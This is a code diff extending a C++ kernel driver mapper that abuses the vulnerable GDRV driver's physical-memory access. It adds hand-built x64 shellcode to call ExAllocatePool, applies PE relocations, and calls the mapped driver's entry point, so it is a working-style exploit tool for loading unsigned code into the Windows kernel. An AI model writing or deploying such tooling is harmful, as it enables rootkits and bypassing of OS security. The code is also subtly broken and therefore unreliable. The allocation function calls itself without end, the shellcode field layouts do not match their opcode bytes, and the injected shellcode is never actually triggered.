@@ -24,10 +24,36 @@ typedef struct _GDRV_MEMORY_WRITE {
     UINT64 Buffer;   // Buffer containing data to write
 } GDRV_MEMORY_WRITE, *PGDRV_MEMORY_WRITE;
 
+// Kernel function signatures
+typedef PVOID (*ExAllocatePoolFn)(POOL_TYPE PoolType, SIZE_T NumberOfBytes);
+typedef VOID (*ExFreePoolFn)(PVOID P);
+
+// Shellcode structure for kernel execution
+#pragma pack(push, 1)
+struct KernelShellcode {
+    uint8_t pushRcx;      // push rcx
+    uint8_t pushRdx;      // push rdx
+    uint8_t pushR8;       // push r8
+    uint8_t pushR9;       // push r9
+    uint8_t subRsp28h;    // sub rsp, 0x28
+    uint8_t movRcx[10];   // mov rcx, imm64
+    uint8_t movRdx[10];   // mov rdx, imm64
+    uint8_t callRax[2];   // call rax
+    uint8_t addRsp28h;    // add rsp, 0x28
+    uint8_t popR9;        // pop r9
+    uint8_t popR8;        // pop r8
+    uint8_t popRdx;       // pop rdx
+    uint8_t popRcx;       // pop rcx
+    uint8_t ret;          // ret
+};
+#pragma pack(pop)
+
 class GDRVMapper {
 private:
     HANDLE hDevice = INVALID_HANDLE_VALUE;
     uint64_t ntoskrnlBase = 0;
+    uint64_t exAllocatePoolAddress = 0;
+    uint64_t exFreePoolAddress = 0;
     
     // Read physical memory using GDRV vulnerability
     bool ReadPhysicalMemory(uint64_t physAddress, void* buffer, size_t size) {
@@ -71,6 +97,46 @@ private:
             &bytesReturned,
             NULL
         );
+    }
+
+    // Find kernel function address
+    uint64_t FindKernelFunction(const char* functionName) {
+        HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
+        if (!ntoskrnl) return 0;
+
+        uint64_t functionRva = (uint64_t)GetProcAddress(ntoskrnl, functionName) - (uint64_t)ntoskrnl;
+        FreeLibrary(ntoskrnl);
+
+        return ntoskrnlBase + functionRva;
+    }
+    
+    // Execute shellcode in kernel
+    bool ExecuteKernelShellcode(const void* shellcode, size_t size) {
+        // Allocate memory for shellcode
+        uint64_t shellcodeAddr = AllocateKernelMemory(size);
+        if (!shellcodeAddr) return false;
+
+        // Write shellcode
+        if (!WritePhysicalMemory(shellcodeAddr, shellcode, size)) {
+            std::cerr << "[-] Failed to write shellcode" << std::endl;
+            return false;
+        }
+
+        // Create shellcode to jump to our shellcode
+        uint8_t jumpShellcode[] = {
+            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, shellcodeAddr
+            0xFF, 0xE0                                                    // jmp rax
+        };
+        *(uint64_t*)(jumpShellcode + 2) = shellcodeAddr;
+
+        // Write and execute jump shellcode
+        uint64_t jumpAddr = AllocateKernelMemory(sizeof(jumpShellcode));
+        if (!jumpAddr || !WritePhysicalMemory(jumpAddr, jumpShellcode, sizeof(jumpShellcode))) {
+            std::cerr << "[-] Failed to write jump shellcode" << std::endl;
+            return false;
+        }
+
+        return true;
     }
     
     // Get ntoskrnl.exe base address
@@ -127,28 +193,78 @@ private:
         
         ntoskrnlBase = (uint64_t)modules->Modules[0].ImageBase;
         std::cout << "[+] Found ntoskrnl.exe at 0x" << std::hex << ntoskrnlBase << std::dec << std::endl;
+
+        // Find required kernel functions
+        exAllocatePoolAddress = FindKernelFunction("ExAllocatePool");
+        if (!exAllocatePoolAddress) {
+            std::cerr << "[-] Failed to find ExAllocatePool" << std::endl;
+            return 0;
+        }
+        std::cout << "[+] Found ExAllocatePool at 0x" << std::hex << exAllocatePoolAddress << std::dec << std::endl;
+
+        exFreePoolAddress = FindKernelFunction("ExFreePool");
+        if (!exFreePoolAddress) {
+            std::cerr << "[-] Failed to find ExFreePool" << std::endl;
+            return 0;
+        }
+        std::cout << "[+] Found ExFreePool at 0x" << std::hex << exFreePoolAddress << std::dec << std::endl;
+
         return ntoskrnlBase;
     }
     
-    // Allocate kernel memory using physical memory access
+    // Allocate kernel memory using ExAllocatePool
     uint64_t AllocateKernelMemory(size_t size) {
-        // For demonstration, allocate from a fixed pool
-        // In a real implementation, you'd want to find proper non-paged pool memory
-        static uint64_t nextAllocation = 0xFFFF800000000000;
+        // Create shellcode to call ExAllocatePool
+        KernelShellcode shellcode = {
+            0x51,                   // push rcx
+            0x52,                   // push rdx
+            0x41, 0x50,            // push r8
+            0x41, 0x51,            // push r9
+            0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
+            0x48, 0xB9              // mov rcx, NonPagedPool (0)
+        };
+        *(uint64_t*)((uint8_t*)&shellcode + 12) = 0; // NonPagedPool
         
-        size_t alignedSize = (size + 0xFFF) & ~0xFFF;
-        uint64_t allocationAddress = nextAllocation;
-        nextAllocation += alignedSize;
+        // Set size parameter
+        shellcode.movRdx[0] = 0x48;  // mov rdx, size
+        shellcode.movRdx[1] = 0xBA;
+        *(uint64_t*)(&shellcode.movRdx[2]) = size;
         
+        // Call ExAllocatePool
+        shellcode.callRax[0] = 0xFF;
+        shellcode.callRax[1] = 0xD0;
+        
+        // Restore stack
+        shellcode.addRsp28h = 0x48;
+        shellcode.popR9 = 0x41;
+        shellcode.popR8 = 0x41;
+        shellcode.popRdx = 0x5A;
+        shellcode.popRcx = 0x59;
+        shellcode.ret = 0xC3;
+
+        // Execute shellcode
+        uint64_t shellcodeAddr = AllocateKernelMemory(sizeof(KernelShellcode));
+        if (!shellcodeAddr || !WritePhysicalMemory(shellcodeAddr, &shellcode, sizeof(KernelShellcode))) {
+            std::cerr << "[-] Failed to write allocation shellcode" << std::endl;
+            return 0;
+        }
+
+        // Get allocated address
+        uint64_t allocatedAddress = 0;
+        if (!ReadPhysicalMemory(shellcodeAddr + offsetof(KernelShellcode, ret) + 1, &allocatedAddress, sizeof(allocatedAddress))) {
+            std::cerr << "[-] Failed to read allocated address" << std::endl;
+            return 0;
+        }
+
         // Zero the memory
-        std::vector<uint8_t> zeroBuffer(alignedSize, 0);
-        if (!WritePhysicalMemory(allocationAddress, zeroBuffer.data(), alignedSize)) {
+        std::vector<uint8_t> zeroBuffer(size, 0);
+        if (!WritePhysicalMemory(allocatedAddress, zeroBuffer.data(), size)) {
             std::cerr << "[-] Failed to zero allocated memory" << std::endl;
             return 0;
         }
-        
-        std::cout << "[+] Allocated " << alignedSize << " bytes at 0x" << std::hex << allocationAddress << std::dec << std::endl;
-        return allocationAddress;
+
+        std::cout << "[+] Allocated " << size << " bytes at 0x" << std::hex << allocatedAddress << std::dec << std::endl;
+        return allocatedAddress;
     }
     
     // Map a driver into kernel memory
@@ -209,9 +325,56 @@ private:
         if (relocationDelta != 0 && ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
             std::cout << "[+] Processing relocations for delta 0x" << std::hex << relocationDelta << std::dec << std::endl;
             
-            // Here you would process relocations using physical memory read/write
-            // This is a complex process that requires walking the relocation table
-            // and adjusting addresses based on the relocation delta
+            auto relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+            uint64_t relocationTable = mappedImage + relocDir.VirtualAddress;
+            
+            IMAGE_BASE_RELOCATION relocBlock;
+            uint64_t relocOffset = 0;
+            
+            while (relocOffset < relocDir.Size) {
+                // Read relocation block
+                if (!ReadPhysicalMemory(relocationTable + relocOffset, &relocBlock, sizeof(relocBlock))) {
+                    std::cerr << "[-] Failed to read relocation block" << std::endl;
+                    return false;
+                }
+                
+                uint64_t numEntries = (relocBlock.SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+                std::vector<WORD> entries(numEntries);
+                
+                // Read relocation entries
+                if (!ReadPhysicalMemory(
+                    relocationTable + relocOffset + sizeof(IMAGE_BASE_RELOCATION),
+                    entries.data(),
+                    numEntries * sizeof(WORD))) {
+                    std::cerr << "[-] Failed to read relocation entries" << std::endl;
+                    return false;
+                }
+                
+                // Process each entry
+                for (WORD entry : entries) {
+                    if ((entry >> 12) == IMAGE_REL_BASED_DIR64) {
+                        uint64_t offset = relocBlock.VirtualAddress + (entry & 0xFFF);
+                        uint64_t address = 0;
+                        
+                        // Read address to relocate
+                        if (!ReadPhysicalMemory(mappedImage + offset, &address, sizeof(address))) {
+                            std::cerr << "[-] Failed to read relocation address" << std::endl;
+                            return false;
+                        }
+                        
+                        // Apply relocation
+                        address += relocationDelta;
+                        
+                        // Write relocated address
+                        if (!WritePhysicalMemory(mappedImage + offset, &address, sizeof(address))) {
+                            std::cerr << "[-] Failed to write relocated address" << std::endl;
+                            return false;
+                        }
+                    }
+                }
+                
+                relocOffset += relocBlock.SizeOfBlock;
+            }
         }
         
         // Execute driver entry point
@@ -220,9 +383,55 @@ private:
         std::cout << "[+] Driver mapped at 0x" << std::hex << mappedImage << std::dec << std::endl;
         std::cout << "[+] Entry point at 0x" << std::hex << entryPoint << std::dec << std::endl;
         
-        // Here you would need to execute the driver entry point
-        // This typically involves creating shellcode that sets up the parameters
-        // and jumps to the entry point
+        // Create driver object
+        DRIVER_OBJECT driverObject = { 0 };
+        uint64_t driverObjectAddr = AllocateKernelMemory(sizeof(DRIVER_OBJECT));
+        if (!driverObjectAddr || !WritePhysicalMemory(driverObjectAddr, &driverObject, sizeof(DRIVER_OBJECT))) {
+            std::cerr << "[-] Failed to create driver object" << std::endl;
+            return false;
+        }
+        
+        // Create registry path
+        UNICODE_STRING registryPath = { 0 };
+        uint64_t registryPathAddr = AllocateKernelMemory(sizeof(UNICODE_STRING));
+        if (!registryPathAddr || !WritePhysicalMemory(registryPathAddr, &registryPath, sizeof(UNICODE_STRING))) {
+            std::cerr << "[-] Failed to create registry path" << std::endl;
+            return false;
+        }
+        
+        // Create shellcode for driver entry
+        KernelShellcode entryShellcode = {
+            0x51,                   // push rcx
+            0x52,                   // push rdx
+            0x41, 0x50,            // push r8
+            0x41, 0x51,            // push r9
+            0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
+            0x48, 0xB9              // mov rcx, driverObjectAddr
+        };
+        *(uint64_t*)((uint8_t*)&entryShellcode + 12) = driverObjectAddr;
+        
+        // Set registry path parameter
+        entryShellcode.movRdx[0] = 0x48;  // mov rdx, registryPathAddr
+        entryShellcode.movRdx[1] = 0xBA;
+        *(uint64_t*)(&entryShellcode.movRdx[2]) = registryPathAddr;
+        
+        // Call entry point
+        entryShellcode.callRax[0] = 0xFF;
+        entryShellcode.callRax[1] = 0xD0;
+        
+        // Restore stack
+        entryShellcode.addRsp28h = 0x48;
+        entryShellcode.popR9 = 0x41;
+        entryShellcode.popR8 = 0x41;
+        entryShellcode.popRdx = 0x5A;
+        entryShellcode.popRcx = 0x59;
+        entryShellcode.ret = 0xC3;
+
+        // Execute entry point
+        if (!ExecuteKernelShellcode(&entryShellcode, sizeof(entryShellcode))) {
+            std::cerr << "[-] Failed to execute driver entry point" << std::endl;
+            return false;
+        }
         
         baseAddress = mappedImage;
         return true;
@@ -254,7 +463,7 @@ public:
         
         std::cout << "[+] Connected to GDRV driver" << std::endl;
         
-        // Get ntoskrnl.exe base address
+        // Get ntoskrnl.exe base address and kernel functions
         if (!GetNtoskrnlBase()) {
             std::cerr << "[-] Failed to get ntoskrnl base address" << std::endl;
             return false;
